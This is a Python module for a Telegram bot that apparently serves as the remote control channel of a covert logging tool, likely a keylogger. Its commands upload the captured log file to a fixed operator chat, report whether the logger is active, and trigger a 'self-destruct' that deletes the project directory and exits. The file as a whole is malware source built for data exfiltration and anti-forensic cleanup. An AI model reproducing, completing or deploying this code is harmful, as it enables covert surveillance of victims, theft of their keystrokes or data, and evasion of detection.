import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from modules.log_formatter import LogFormatter
import os
import platform
import shutil
import sys



class TelegramBot:
    def __init__(self, bot_token, chat_id, log_file):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.log_file = log_file
        self.application = None
    
    async def _send_logs_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_chat.id) != str(self.chat_id):
            return
        
        if not os.path.exists(self.log_file):
            await update.message.reply_text("No logs available.")
            return
        
        try:
            formatted_path = self.log_file + '.formatted.txt'
            LogFormatter.format_log(self.log_file, formatted_path)
            
            file_to_send = formatted_path if os.path.exists(formatted_path) else self.log_file
            
            with open(file_to_send, 'rb') as file:
                await update.message.reply_document(
                    document=file,
                    caption=f"Log - {platform.system()}"
                )
            
            if os.path.exists(formatted_path):
                os.remove(formatted_path)
                
        except Exception as e:
            await update.message.reply_text(f"Error sending logs: {str(e)}")
    
    async def _status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_chat.id) != str(self.chat_id):
            return
        
        if os.path.exists(self.log_file):
            size = os.path.getsize(self.log_file)
            await update.message.reply_text(
                f"Logger active\n"
                f"Log size: {size} bytes"
            )
        else:
            await update.message.reply_text("No logs present")
    
    async def _kill_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_chat.id) != str(self.chat_id):
            return
        
        try:
            await update.message.reply_text("Self-destructing in 3 seconds...")
            await asyncio.sleep(3)

            project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

            await self.stop()

            shutil.rmtree(project_root)
            
            sys.exit(0)
            
        except Exception as e:
            await update.message.reply_text(f"Error during self-destruction: {str(e)}")
    
    async def start(self):
        self.application = Application.builder().token(self.bot_token).build()
        
        self.application.add_handler(CommandHandler("logs", self._send_logs_command))
        self.application.add_handler(CommandHandler("status", self._status_command))
        self.application.add_handler(CommandHandler("kill", self._kill_command))
        
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()
    
    async def stop(self):
        if self.application:
            await self.application.updater.stop()
            await self.application.stop()
            await self.application.shutdown()
